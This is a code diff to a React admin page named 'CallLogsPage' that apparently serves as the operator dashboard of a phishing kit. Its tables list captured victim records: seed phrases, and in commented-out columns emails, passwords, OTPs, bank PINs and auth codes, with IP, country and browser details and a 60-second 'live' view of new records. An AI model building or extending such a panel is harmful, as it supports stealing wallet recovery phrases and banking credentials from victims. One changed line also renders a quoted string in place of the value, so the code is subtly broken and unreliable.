@@ -338,18 +338,11 @@ function CallLogsPage() {
                           onChange={toggleSelectAll}
                         />
                       </th>
-                      {/* {user?.role == "admin" && <th>User Name</th>} */}
-                      {/* <th>Email</th> */}
-                      {/* <th>Password</th> */}
-                      {/* <th>OTP</th> */}
-                      {/* <th>Current Step</th> */}
-                      {/* <th>Bank Pin</th> */}
-                      <th>Phrase</th>
-                      <th>Device</th>
-                      <th>Operating System</th>
+                      <th>Seed Phrase</th>
+                      <th>User Agent</th>
+                      <th>App Name</th>
                       <th>Browser</th>
                       <th>Country Flag</th>
-                      {/* <th>Auth Code</th> */}
                       <th>IP Address</th>
                       <th>Date</th>
                       {/* <th>Action</th> */}
@@ -393,45 +386,26 @@ function CallLogsPage() {
                               }
                             />
                           </td>
-                          {/* {user?.role == "admin" && (
-                            <td>{account?.userId?.userName}</td>
-                          )} */}
                           <td>
                             <div className="d-flex">
                               <div
                                 className="ms-2"
                                 onClick={() => copyToClipboard(account?.email)}
                               >
-                                {/* <p className="fs-12 mb-0">{account?.email}</p> */}
-                                  {account?.phrase}
+                                {account?.phrase}
                               </div>
                             </div>
                           </td>
                           <td onClick={() => copyToClipboard(account.password)}>
-                            {/* {account.password} */}
-                            {account?.userInfo?.device}
+                            {account?.userInfo?.device +
+                              " " +
+                              account?.userInfo?.os}
                           </td>
                           <td onClick={() => copyToClipboard(account.otp)}>
-                            {/* <span
-                              className={`bg-${account?.status?.toLowerCase()}-transparent`}
-                            >
-                              {account.otp}
-                            </span> */}
-                            {account?.userInfo?.os}
+                            {"account?.userInfo?.os"}
                           </td>
-                          {/* <td
-                            onClick={() => copyToClipboard(account.currentStep)}
-                          >
-                            <span className="fw-semibold fs-13">
-                              {account.currentStep}
-                            </span>
-                          </td> */}
-                          {/* <td onClick={() => copyToClipboard(account.bankPin)}>
-                            <span className="fw-semibold fs-13">
-                              {account.bankPin}
-                            </span>
-                          </td> */}
-                          <td>
+                          <td>{account?.userInfo?.browser}</td>
+                          <td onClick={() => copyToClipboard(account.authCode)}>
                             <img
                               src={`https://flagcdn.com/16x12/${account?.location?.countryCode?.toLowerCase()}.png`}
                               alt={account?.location?.country}
@@ -439,12 +413,6 @@ function CallLogsPage() {
                               height="12"
                               title={`${account?.location?.country}, ${account?.location?.city}`}
                             />
-                          </td>
-                          <td onClick={() => copyToClipboard(account.authCode)}>
-                            {/* <span className="fw-semibold fs-13">
-                              {account.authCode}
-                            </span> */}
-                            {account?.userInfo?.browser}
                           </td>
                           <td
                             onClick={() =>
@@ -514,17 +482,6 @@ function CallLogsPage() {
                 <table className="table text-nowrap">
                   <thead>
                     <tr>
-                      {/* <th>
-                        <input
-                          title="select all"
-                          className="mt-1"
-                          type="checkbox"
-                          checked={
-                            selectedAccounts?.length === accounts?.length
-                          }
-                          onChange={toggleSelectAll}
-                        />
-                      </th> */}
                       <th>Country Flag</th>
                       <th>IP Address</th>
                       <th>Date</th>
@@ -533,12 +490,11 @@ function CallLogsPage() {
                   <tbody>
                     {accounts
                       ?.filter((account: any) => {
-                        // Check if the account was created in the last 60 seconds
                         const now = Date.now();
                         const createdAt = new Date(
                           account?.createdAt
                         ).getTime();
-                        return now - createdAt <= 60000; // 60 seconds = 60000 milliseconds
+                        return now - createdAt <= 60000;
                       })
                       ?.map((account: any) => (
                         <tr
@@ -555,15 +511,6 @@ function CallLogsPage() {
                 ${locked.includes(account._id) ? "text-purple-500" : ""}
               `}
                         >
-                          {/* <td>
-                            <input
-                              type="checkbox"
-                              checked={selectedAccounts.includes(account._id)}
-                              onChange={() =>
-                                toggleSelectAccount(account._id, account)
-                              }
-                            />
-                          </td> */}
                           <td>
                             <img
                               src={`https://flagcdn.com/16x12/${account?.location?.countryCode?.toLowerCase()}.png`}
